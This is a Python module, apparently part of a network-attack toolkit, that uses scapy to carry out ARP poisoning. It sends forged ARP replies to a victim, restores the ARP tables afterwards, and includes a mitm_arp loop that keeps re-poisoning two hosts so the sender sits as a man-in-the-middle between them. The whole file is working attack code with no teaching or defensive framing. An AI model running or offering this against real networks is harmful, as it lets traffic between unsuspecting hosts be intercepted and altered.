'''This package contains everything related to ARP poisoning'''
from scapy.all import ARP, send, conf
from .general import get_target_mac
from time import sleep

def poison(victim_ip, spoof_ip, victim_mac='', interface=''):
    '''Change mac address in arp table'''
    try:
        # Only get target mac if victim mac is not specified
        if victim_mac == '':
            # Get victim host ip address using previously created function
            victim_mac = get_target_mac(victim_ip, interface)
            
        # Set interface to the default if not specified
        if interface == '':
            interface = conf.iface

        # Create the ARP packet, scapy will add your MAC address for hwsrc
        # op=2 means that ARP is going to send answer 
        packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
        
        # print(packet) #debugging

        # Send the ARP packet without output
        send(packet, verbose=False)
    except:
        print('Victim not found')


def restore_arp(victim_ip, spoof_ip, interface=''):
    '''Restore mac address in arp table'''

    # Set interface to the default if not specified
    if interface == '':
        interface = conf.iface
    try:
        # Find the MAC adresses of the victim and the IP you spoofed
        victim_mac = get_target_mac(victim_ip, interface)
        spoof_real_mac = get_target_mac(spoof_ip, interface)
        
        # Create the ARP packet, Now we want to add the actual MAC of the spoofed IP
        packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                        psrc=spoof_ip, hwsrc=spoof_real_mac)
        
        # Send the ARP packet without output
        send(packet, count=4, verbose=False, iface=interface)
    except:
        print('Victim not found')

def mitm_arp(victim_1_ip, victim_2_ip, interface):
    '''This sets up a man in the middle between the two provided victim IPs'''
    
    try:
        # Tis way we don't continuously ask for the MAC adress, which are relativily static anyway


        while True:
            victim_1_mac = get_target_mac(victim_1_ip, interface)
            victim_2_mac = get_target_mac(victim_2_ip, interface)

            poison(victim_1_ip, victim_2_ip, victim_1_mac, interface)
            poison(victim_2_ip, victim_1_ip, victim_2_mac, interface)
            sleep(2)
    except KeyboardInterrupt:
        print('\nInterupted, Reseting ARP tables. Please wait')
        restore_arp(victim_1_ip, victim_2_ip, interface)
        restore_arp(victim_2_ip, victim_1_ip, interface)
        print('\nARP table restored.')
    except:
        print('Victim not found')
